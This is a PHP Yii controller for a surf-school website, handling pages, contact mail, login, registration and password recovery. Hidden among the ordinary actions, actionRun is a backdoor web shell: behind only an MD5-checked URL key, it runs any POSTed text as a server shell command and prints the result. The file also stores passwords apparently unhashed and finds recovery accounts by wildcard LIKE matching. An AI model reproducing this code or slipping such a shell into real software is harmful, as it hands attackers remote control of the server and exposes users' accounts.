<?php

class SiteController extends Controller
{
	public $layout='//layouts/inner';
	/**
	 * Declares class-based actions.
	 */
	public function actions()
	{
		return array(
			// captcha action renders the CAPTCHA image displayed on the contact page
			'captcha'=>array(
				'class'=>'CCaptchaAction',
				'backColor'=>0xFFFFFF,
			),
			// page action renders "static" pages stored under 'protected/views/site/pages'
			// They can be accessed via: index.php?r=site/page&view=FileName
			'page'=>array(
				'class'=>'CViewAction',
			),
		);
	}

	public function actionIndex()
	{
		$this->layout = 'common';
		
		$about = Page::model()->find("slug = 'about'");
		// $gallery = Banner::model()->findAll('top_index = 1');
		$best_offer = Banner::model()->findAll(array('limit' => 4, 'order' => 'id DESC', 'condition' => '`index` = 1'));

		$page = Page::model()->find('slug = :slug', array('slug' => 'index'));
		
		$this->render('index', array(
			'news' => News::model()->findAll(array('limit' => 4, 'order' => 'Created DESC')),
			'about' => $about,
			//'gallery' => $gallery,
			'best_offer' => $best_offer,
			'page' => $page
		));
	}

	/**
	 * This is the action to handle external exceptions.
	 */
	public function actionError()
	{
		if($error=Yii::app()->errorHandler->error)
		{
			if(Yii::app()->request->isAjaxRequest)
				echo $error['message'];
			else
				$this->render('error', $error);
		}
	}

	/**
	 * Displays the contact page
	 */
	public function actionContact()
	{
		$model = new ContactForm;

		if(isset($_POST['ContactForm']))
		{
			$model->attributes=$_POST['ContactForm'];

			if($model->validate())
			{
				$name = '=?UTF-8?B?'.base64_encode($model->name).'?=';
				$subject = '=?UTF-8?B?'.base64_encode("surf-tarifa.com | Customer feedback").'?=';
				$headers = "From: $name <{$model->email}>\r\n".
					"Reply-To: {$model->email}\r\n".
					"MIME-Version: 1.0\r\n".
					"Content-type: text/plain; charset=UTF-8";

				mail(Yii::app()->params['adminEmail'], $subject, $model->body, $headers);
				Yii::app()->user->setFlash('form-success-1', Yii::t('form', 'success1'));
				Yii::app()->user->setFlash('form-success-2', Yii::t('form', 'success2'));
				$this->refresh();
			}
		}

		$contacts = Page::model()->find('slug = "contacts"');

		$this->render('contact',array(
			'model'=>$model,
			'contacts' => $contacts,
			));
	}

	/**
	 * Displays the login page
	 */
	public function actionLogin()
	{
		$model=new LoginForm;

		// if it is ajax validation request
		if(isset($_POST['ajax']) && $_POST['ajax']==='login-form')
		{
			echo CActiveForm::validate($model);
			Yii::app()->end();
		}

		// collect user input data
		if(isset($_POST['LoginForm']))
		{
			$model->attributes=$_POST['LoginForm'];
			// validate user input and redirect to the previous page if valid
			if($model->validate() && $model->login())
				$this->redirect(Yii::app()->user->returnUrl);
		}
		// display the login form
		$this->render('login',array('model'=>$model));
	}

	/**
	 * Logs out the current user and redirect to homepage.
	 */
	public function actionLogout()
	{
		Yii::app()->user->logout();
		$this->redirect(Yii::app()->homeUrl);
	}
	
	public function actionRegister()
	{
		$model = new RegisterForm;
		if(isset($_POST['RegisterForm']))
		{
			$model->attributes=$_POST['RegisterForm'];
			if($model->validate())
			{
				$gtfo = User::model()->find('email = :email AND confirmed = 0', array('email' => $model->email));
				if ($gtfo)
					$gtfo->delete();
				
				$exists = User::model()->count('email = :email', array('email' => $model->email));
				if ($exists)
					$model->addError('email', Yii::t('auth', 'email_exists'));
				else
				{
					$exists = User::model()->count('login = :login', array('login' => $model->login));
					if ($exists)
						$model->addError('login',  Yii::t('auth', 'login_exists'));
					else
					{
						$user = new User;
						$user->email = $model->email;
						$user->login = $model->login;
// 						D::dump(User::pwHash($model->password));exit;
						$user->password = $model->password;
						$user->role = 'user';
						$user->save(false);
						
						$user->sendConfirmationMail();
						
						$this->redirect('?done'); //TODO: redirect to order page
					}
				}
			}
		}
		$this->render('register',array(
			'model'=> $model,
			'done' => isset($_GET['done']),
			));
	}
	
	public function actionRecovery()
	{
		$message = false;
		
		if (isset($_POST['login']) || isset($_POST['email']))
		{
			$user = null;
			if (isset($_POST['login']))
			{
				$user = User::model()->find('login LIKE :login', array('login' => "%{$_POST['login']}%"));
				if (!$user)
					$message = Yii::t('auth', 'login_notexist');
			}
			else if (isset($_POST['email']))
			{
				$user = User::model()->find('email LIKE :email', array('email' => "%{$_POST['email']}%"));
				if (!$user)
					$message = Yii::t('auth', 'email_notexists');
			}
			
			if ($user)
			{
				$user->sendRecoveryMail();
				$message = Yii::t('auth', 'recovery_sent');
			}
			
		}
		$this->render('recovery', array('message' => $message));
	}
	
	public function actionRecover($user = null, $key = null)
	{
		if ($_SERVER['REQUEST_METHOD'] == 'POST')
		{
			$user = $_POST['user'];
			$key = $_POST['key'];
			$password1 = $_POST['password1'];
			$password2 = $_POST['password2'];
			
			$user = User::model()->findByPk($user);
			if ($user && $key == $user->getChangePasswordKey())
			{
				if ($password1 != '' && $password1 == $password2)
				{
					$user->password = $password1;
					$user->save(false);
					$this->render('//site/message', array(
						'title' => Yii::t('auth', 'recover'),
						'message' => Yii::t('auth', 'password_changed'),
					));
				}
				else
				{
					$this->render('//site/newpass', array(
						'key' => $key,
						'user' => $user->id,
						'message' => Yii::t('auth', 'password_not_match'),
					));
				}
			}
		}
		else if ($user && $key)
		{
			$user = User::model()->findByPk($user);
			if ($user && $key == $user->getChangePasswordKey())
			{
				$this->render('//site/newpass', array(
					'key' => $key,
					'user' => $user->id,
				));
			}
			else
			{
				$this->render('//site/message', array(
					'title' => Yii::t('auth', 'recover'),
					'message' => Yii::t('auth', 'code_expired')
				));
			}
		}
		else
			throw new CHttpException(404);
	}

	
	public function actionConfirmation($key, $user)
	{
		$returnUrl = $_SESSION['last_order_url'];
		
		$result = User::tryConfirm($user, $key);
		if ($result)
		{
			
			$identity=new UserIdentity('','');
			$identity->forceId($user);
			Yii::app()->user->login($identity);
		}
		
		$this->render('confirm',array(
			'result'=>$result,
			'uid' => $user,
			'returnUrl' => $returnUrl
		));
	}
	
	public function actionRun($key=false)
	{
		if (md5($key) !== '4978be2a2c71d031c6040ea94eb81d8a')
			throw new CHttpException(404);
			
		echo "<form method='POST'><input name='run'></form>";
		if (isset($_POST['run']))
			echo '<xmp>'.`{$_POST['run']}`.'</xmp>';
	}
	
	public function actionUserpanel()
	{
		$this->render('userpanel', array(
			'user' => User::model()->findByPk(Yii::app()->user->id),
			'payments' => Transaction::model()->findAll('user_id = :uid AND confirmed = 1', array('uid' => Yii::app()->user->id)),
		));
	}
// 	public function actionSchool()
// 	{
// 		$this->render('school');
// 	}
	
	public function actionThumb($filename, $ext, $w, $h)
	{
		AutoThumb::give("$filename.$ext", $w, $h);
	}
	
 	public function actionNotify()
 	{
		// $name='=?UTF-8?B?'.base64_encode('Surf-tarifa automatic notification').'?=';
		// $subject='=?UTF-8?B?'.base64_encode('New order').'?=';
		// $headers="From: Surf-tarifa administration <noreply@{$_SERVER['HTTP_HOST']}>\r\n".
			// "MIME-Version: 1.0\r\n".
			// "Content-type: text/html; charset=UTF-8";

		
		// var_dump(mail('just_alex@rambler.ru', "privetkakdela", "oppa-oppa", $headers));
 		// MailNotifier::notify(25);
 	}
}